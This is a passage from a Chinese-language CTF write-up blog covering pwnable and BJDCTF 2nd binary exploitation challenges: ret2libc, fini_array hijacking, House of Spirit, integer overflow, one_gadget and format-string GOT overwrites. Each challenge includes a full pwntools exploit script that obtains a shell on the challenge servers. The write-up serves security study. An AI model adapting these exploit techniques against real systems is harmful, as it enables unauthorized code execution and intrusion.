p32(libc_base + libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/02/27/cmdyKHngVLFiJ8X.png" alt="image.png"></p>
<h2 id="0x-pwnable-dubblesort-ret2libc"><a href="#0x-pwnable-dubblesort-ret2libc" class="headerlink" title="0x???.pwnable_dubblesort - ret2libc"></a>0x???.pwnable_dubblesort - ret2libc</h2><p>惯例的<code>checksec</code>，保护全开</p>
<p><img src="https://i.loli.net/2021/02/27/PLht9TuRaWy1MUZ.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2021/02/27/pG2ONZMKYmC9DwE.png" alt="image.png"></p>
<p>一开始先输入一个字符串，后门输入要排序的数的数量和要排序的数，在这里检测不严密导致我们可以直接覆写函数返回地址为我们想要的数字</p>
<p>通过栈上残留的指针 + gdb调试我们可以得到libc的基址</p>
<p><img src="https://i.loli.net/2021/02/27/QdXWLnvjRx2agfP.png" alt="image.png"></p>
<blockquote>
<p>这里我本地调出来的不对，gdb调试又没法装载他给的libc（format error）…就很离谱…</p>
<p>手动试了几次发现我本地多三个页…</p>
</blockquote>
<p>接下来我们该考虑如何覆写栈上内容的同时不改变canary同时保持rop链的完备性</p>
<p>gdb调试可知canary的值其实是小于libc基址的</p>
<p><img src="https://i.loli.net/2021/02/27/VeTOK5sfwIF21ok.png" alt="image.png"></p>
<p>而我们的输入要想不破坏canary，绕过scanf则只需要输入<code>&#39;+&#39;</code>或<code>&#39;-&#39;</code>即可</p>
<p>而system的地址也小于<code>/bin/sh</code>的地址，中间我们只需要填充适当值即可</p>
<p><img src="https://i.loli.net/2021/02/27/xA5WsPXHcJMErhL.png" alt="image.png"></p>
<p>故最终的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10101</span>)<span class="comment">#process(&#x27;./dubblesort&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">3</span>)</span><br><span class="line">libc_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(p32(libc_leak))</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">libc_base = libc_leak - <span class="number">0x1b000a</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;35&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;+&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(libc_base + libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/02/27/LVh82fT6JQZHN3s.png" alt="image.png"></p>
<h2 id="0x-pwnable-317-fini-array-hijack"><a href="#0x-pwnable-317-fini-array-hijack" class="headerlink" title="0x???.pwnable_317 - fini_array hijack"></a>0x???.pwnable_317 - fini_array hijack</h2><p>惯例的<code>checksec</code>，只开了NX</p>
<p><img src="https://i.loli.net/2021/02/27/yzjRDksxLqfVa8E.png" alt="image.png"></p>
<p>拖入IDA进行分析，静态编译 + 符号表扣光（悲</p>
<p>通过<code>_start()</code>函数我们能够了解到这个函数应当为main函数</p>
<p><img src="https://i.loli.net/2021/02/27/pBVklLQGU9zqPne.png" alt="image.png"></p>
<p>其功能为往指定地址写最大0x18字节的数据，但是只能写一次</p>
<p>由于程序是静态编译的，故考虑劫持<code>fini_array</code>数组控制程序执行流以get shell</p>
<p><img src="https://i.loli.net/2021/02/27/Bx7yVTuO6sGRj13.png" alt="image.png"></p>
<p>一开始只能读一次，那么考虑劫持<code>fini_array[1]</code>为main、<code>fini_array[1]</code>为<code>__libc_csu_fini()</code>以反复读入，由于rbp的值便是<code>fini_array</code>，故我们可以将栈劫持到<code>fini_array</code>附近，在这里构造我们的rop链</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28247</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./3x17&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x401B6D</span></span><br><span class="line">csu_fini = <span class="number">0x402960</span></span><br><span class="line">fini_array = <span class="number">0x4B40F0</span></span><br><span class="line">pop_rax_ret = e.search(asm(<span class="string">&#x27;pop rax ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rdi_ret = e.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rsi_ret = e.search(asm(<span class="string">&#x27;pop rsi ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rdx_ret = e.search(asm(<span class="string">&#x27;pop rdx ; ret&#x27;</span>)).__next__()</span><br><span class="line">syscall = e.search(asm(<span class="string">&#x27;syscall&#x27;</span>)).__next__()</span><br><span class="line">leave_ret = e.search(asm(<span class="string">&#x27;leave ; ret&#x27;</span>)).__next__()</span><br><span class="line">ret = e.search(asm(<span class="string">&#x27;ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr:<span class="built_in">int</span>, data</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;addr:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;data:&quot;</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line">    </span><br><span class="line">write(fini_array, p64(csu_fini) + p64(main))</span><br><span class="line">write(fini_array + <span class="number">0x10</span>, p64(pop_rax_ret) + p64(<span class="number">59</span>)) <span class="comment"># execve</span></span><br><span class="line">write(fini_array + <span class="number">0x20</span>, p64(pop_rdi_ret) + p64(fini_array + <span class="number">0x60</span>))</span><br><span class="line">write(fini_array + <span class="number">0x30</span>, p64(pop_rsi_ret) + p64(<span class="number">0</span>))</span><br><span class="line">write(fini_array + <span class="number">0x40</span>, p64(pop_rdx_ret) + p64(<span class="number">0</span>))</span><br><span class="line">write(fini_array + <span class="number">0x50</span>, p64(syscall))</span><br><span class="line">write(fini_array + <span class="number">0x60</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">write(fini_array, p64(leave_ret) + p64(ret))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/02/27/Dl1hgcViX4sv93T.png" alt="image.png"></p>
<h2 id="0x-pwnable-spirited-away-House-of-Spirit"><a href="#0x-pwnable-spirited-away-House-of-Spirit" class="headerlink" title="0x???.pwnable_spirited_away - House of Spirit"></a>0x???.pwnable_spirited_away - House of Spirit</h2><p>惯例的 checksec，只开了 NX</p>
<p><img src="https://i.loli.net/2021/09/10/V8oGk3vSJajbsA6.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>红色箭头所指刚好可以写到 ebp 前面，一打印就可以把栈上数据打印出来</p>
<p>蓝色箭头所指使用了 sprintf，储存的位置刚好在 nbytes 上面，<code>cnt</code> 是我们输入的次数（下方有个大循环可以跳回 LABEL_2）</p>
<p><img src="https://i.loli.net/2021/09/10/cl7sfARSbHMm14t.png" alt="image.png"></p>
<p>输入次数达到 100 时刚好可以溢出一个字节 <code>n</code> 到 nbytes，由此可以在读入 <code>s</code> 时溢出到 buf 域劫持指针</p>
<p><img src="https://i.loli.net/2021/09/10/dx9rvfSbUZYN34c.png" alt="image.png"></p>
<p>ebp 泄露栈地址，栈上还有一个 stdout 泄露 libc</p>
<p><img src="https://i.loli.net/2021/09/10/ElpQYMe2zJWH1nV.png" alt="image.png"></p>
<p>在栈上布置好一个 chunk 结构后改写 buf 为栈上地址就可以 rop 了</p>
<p>需要注意的一点是当数量在 10 ~ 99 这个区间时 nbytes 的位置刚好是 <code>&#39;\0&#39;</code>，这个时候我们是没法进行输入的</p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;spirited_away&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26496</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/32bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your name:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;artt&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your age: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;114514&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Why did you came to see this movie? &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x50</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your comment: &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;nba3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_leak = u32(p.recvuntil(<span class="string">b&#x27;\xff&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">log.info(<span class="string">&#x27;stack leak: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line">p.recv(<span class="number">4</span>)</span><br><span class="line">libc_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&#x27;libc leak: &#x27;</span> + <span class="built_in">hex</span>(libc_leak))</span><br><span class="line">libc_base = libc_leak - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Would you like to leave another comment? &lt;y/n&gt;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter your name:&#x27;</span>, <span class="string">b&#x27;artt&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter your age: &#x27;</span>, <span class="string">b&#x27;114514&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Why did you came to see this movie? &#x27;</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter your comment: &#x27;</span>, <span class="string">b&#x27;nba3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Would you like to leave another comment? &lt;y/n&gt;:&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">90</span>):</span><br><span class="line">    <span class="comment">#p.sendlineafter(b&#x27;Please enter your name:&#x27;, b&#x27;artt&#x27;)</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter your age: &#x27;</span>, <span class="string">b&#x27;114514&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Why did you came to see this movie? &#x27;</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Would you like to leave another comment? &lt;y/n&gt;:&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your name:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your age: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;114514&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Why did you came to see this movie? &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + (p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>)).ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your comment: &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x54</span> + p32(stack_leak - <span class="number">0x20</span> - <span class="number">0x50</span> + <span class="number">8</span> + <span class="number">8</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Would you like to leave another comment? &lt;y/n&gt;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your name:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x40</span> + <span class="string">b&#x27;artt&#x27;</span> + p32(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;nba3&#x27;</span> + p32(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your age: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;114514&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Why did you came to see this movie? &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your comment: &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Would you like to leave another comment? &lt;y/n&gt;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/09/10/JxmsOqrLG1EhYyV.png" alt="image.png"></p>
<h1 id="BJDCTF-2nd-Pwn"><a href="#BJDCTF-2nd-Pwn" class="headerlink" title="BJDCTF 2nd - Pwn"></a>BJDCTF 2nd - Pwn</h1><blockquote>
<p>单开分区对我来说的结果就是我好多题的序号需要重排（恼）</p>
</blockquote>
<h2 id="BJDCTF-2nd-r2t3-integer-overflow-ret2text"><a href="#BJDCTF-2nd-r2t3-integer-overflow-ret2text" class="headerlink" title="[BJDCTF 2nd]r2t3 - integer overflow + ret2text"></a>[BJDCTF 2nd]r2t3 - integer overflow + ret2text</h2><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/09/18/KoFCaQM71JZzNgA.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>主函数中读入最大0x400个字节，但是开辟了0x408字节的空间，无法溢出</p>
<p><img src="https://i.loli.net/2020/10/07/usMxPdgyVGUtAEB.png" alt="image.png"></p>
<p>同时主函数会将输入传入<code>name_check()</code>函数中，若通过<code>strlen()</code>计算出来的长度在4~8个字节之间则会将我们的输入通过<code>strcpy()</code>拷贝至<code>dest</code>上，而这里到ebp之间只有<code>0x11</code>个字节的空间，我们完全可以通过这段代码覆盖掉该函数的返回地址</p>
<p><img src="https://i.loli.net/2020/09/18/GlzDVrQKSOiykoN.png" alt="image.png"></p>
<p>同时我们可以观察到存在可以直接getshell的后门函数</p>
<p><img src="https://i.loli.net/2020/09/18/QNlFfbPJyCDL9I5.png" alt="image.png"></p>
<p>考虑到在<code>name_check()</code>函数中用来存放输入长度的变量为8位无符号整型，范围为0~255，故我们只需要输入260个字节便可以发生上溢降使该变量的值上溢为4，绕过判定</p>
<p>故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x11</span> + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x804858b</span>) + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">260</span> - <span class="number">4</span> - <span class="number">4</span> - <span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./r2t3&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,25595)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>发送payload即可getshell</p>
<p><img src="https://i.loli.net/2020/09/18/XmBDE6Lk8UHlN1R.png" alt="image.png"></p>
<h2 id="BJDCTF-2nd-one-gadget-one-gadget"><a href="#BJDCTF-2nd-one-gadget-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget - one_gadget"></a>[BJDCTF 2nd]one_gadget - one_gadget</h2><blockquote>
<p> 首先从题目名字我们就可以看出这道题应该需要我们用到一个工具——<a target="_blank" rel="noopener" href="https://github.com/david942j/one_gadget">one_gadget</a></p>
<p> 什么是one_gadget？即在libc中存在着的可以直接getshell的gadget</p>
</blockquote>
<p>惯例的<code>checksec</code>，发现<strong>保  护  全  开</strong>（<strong>心 肺 停 止</strong></p>
<p><img src="https://i.loli.net/2020/09/20/LrGYDRVBwkmJ49K.png" alt="image.png"></p>
<p>拖进IDA里分析</p>
<p><img src="https://i.loli.net/2020/09/20/sh7PJmrCWN2fRBv.png" alt="image.png"></p>
<p>主函数会读入一个整数到<strong>函数指针</strong>v4中，并尝试执行<code>v4()</code>，故我们只需要输入<strong>one_gadget</strong>的地址即可getshell</p>
<p>使用<code>one_gadget</code>工具可以找出libc中的getshell gadget</p>
<blockquote>
<p>不明原因在arch上一直没法运行，只好切到Ubuntu</p>
</blockquote>
<p><img src="https://i.loli.net/2020/09/20/I5t8xJdkwloaGeA.png" alt="image.png"></p>
<p>但是我们还需要知道libc的基址</p>
<p>我们可以发现在<code>init()</code>函数中会输出<code>printf()</code>函数的地址，有了这个我们便可以计算出libc的基址，也就有了one_gadget的真实地址</p>
<p>而题目也给了我们libc，故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0xe237f</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./one_gadget&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,27792)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./one_gadget&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.29.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;here is the gift for u:&#x27;</span>)</span><br><span class="line">printf_addr = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">getshell = libc_base + one_gadget</span><br><span class="line">p.sendline(<span class="built_in">str</span>(getshell))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="BJDCTF-2nd-r2t4-fmtstr"><a href="#BJDCTF-2nd-r2t4-fmtstr" class="headerlink" title="[BJDCTF 2nd]r2t4 - fmtstr"></a>[BJDCTF 2nd]r2t4 - fmtstr</h2><p>惯例的<code>checksec</code>，开了NX和canary</p>
<p><img src="https://i.loli.net/2020/12/01/zPCHqKLigBI4Nwd.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/12/01/W6sVY2Hp4TFECBO.png" alt="image.png"></p>
<p>main中存在溢出，且存在格式化字符串漏洞</p>
<p><img src="https://i.loli.net/2020/12/01/jIJCdMwZ9ufy3ti.png" alt="image.png"></p>
<p>存在可以读取flag的后门函数</p>
<p>简单尝试可以发现格式化字符串是位于栈上的第六个参数</p>
<p><img src="https://i.loli.net/2020/12/01/eI31RvsilqYKpTZ.png" alt="image.png"></p>
<p>故考虑利用格式化字符串进行任意地址写劫持got表中的__stack_chk_fail为后门函数地址即可</p>
<p>需要注意的是<code>printf</code>函数遇到<code>\x00</code>会发生截断，故不能直接使用fmtstr_payload，而是要用手写的格式化字符串</p>
<p>需要注意的是为了防止输出过长而卡顿，我们最好分多次写，这里分了两次的二字节写</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./r2t4&#x27;</span>)<span class="comment">#remote(&#x27;node3.buuoj.cn&#x27;,25635)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line">backdoor = <span class="number">0x400626</span></span><br><span class="line">payload = <span class="string">b&#x27;%64c%9$hn%1510c%10$hnaaa&#x27;</span> + p64(e.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]+<span class="number">2</span>) + p64(e.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>])<span class="comment">#fmtstr_payload(6,&#123;e.got[&#x27;__stack_chk_fail&#x27;]:backdoor&#125;)</span></span><br><span class="line">payload.ljust(<span class="number">100</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>获得flag</p>
<p><img src="https://i.loli.net/2020/12/01/3KvIRtcrT1z9LUm.png" alt="image.png"></p>
<blockquote>
<h3 id="利用格式化字符串构造任意地址写"><a href="#利用格式化字符串构造任意地址写" class="headerlink" title="利用格式化字符串构造任意地址写"></a>利用格式化字符串构造任意地址写</h3><p>这里简单说一下格式化字符串进行任意地址写的构造，主要利用 <code>%n</code> 这一个特殊的参数： 不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量（摘自wikipedia）</p>
<p>格式化字符串的格式如下：</p>
<p><code>%[*parameter*][*flags*][*field width*][.*precision*][*length*]*type*</code></p>
<p>我们可以通过直接指定 <code>field width</code> 的值填充输出的长度，后续只需要在格式化字符串的相应位置放上相应指针参数即可</p>
<p>例：</p>
<ul>
<li><code>%64c%9$hhn</code>：在栈上第九个参数指向的位置写上 <code>0x40</code>（写的范围：char等同长度）</li>
<li><code>%64c%9$hn</code>：在栈上第九个参数指向的位置写上 <code>0x40</code>（写的范围：short等同长度）</li>
</ul>
<p>参照常规的格式化字符串即可</p>
</blockquote>
<h2 id="BJDCTF-2nd-test-Linux基础知识"><a href="#BJDCTF-2nd-test-Linux基础知识" class="headerlink" title="[BJDCTF 2nd]test - Linux基础知识"></a>[BJDCTF 2nd]test - Linux基础知识</h2><p>题目只给了一个ssh，尝试进行连接</p>
<p><img src="https://i.loli.net/2020/12/01/WqAa8StsGKveMTw.png" alt="image.png"></p>
<p>尝试一下发现我们无法直接获得flag</p>
<p><img src="https://i.loli.net/2020/12/01/BsjidqO7gZcCfEv.png" alt="image.png"></p>
<p>查看一下文件权限，发现只有<code>ctf_pwn</code>用户组才有权限</p>
<p><img src="https://i.loli.net/2020/12/01/ETx7LSG5zC9Zeul.png" alt="image.png"></p>
<p>提示告诉我们有一个可执行文件test与其源码，尝试阅读</p>
<p><img src="https://i.loli.net/2020/12/01/g7qk6h8j2BM4Y3T.png" alt="image.png"></p>
<p>该程序会将我们的输入作为命令执行，但是会过滤一部分字符</p>
<p>尝试使用如下指令查看剩余的可用命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$ ls /usr/bin/ /bin/ | grep -v -E &quot;n|e|p|b|u|s|h|i|f|l|a|g&quot;`</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/12/01/2zWulrZ5IOGcELP.png" alt="image.png"></p>
<p>我们发现在test程序中有效用户组为<code>ctf_pwn</code>，故使用该程序获取一个shell即可获得flag</p>
<p><img src="https://i.loli.net/2020/12/01/r4U1m3TiBjohkZF.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/12/01/j8LHM4DzXE6pZ5m.png" alt="image.png"></p>
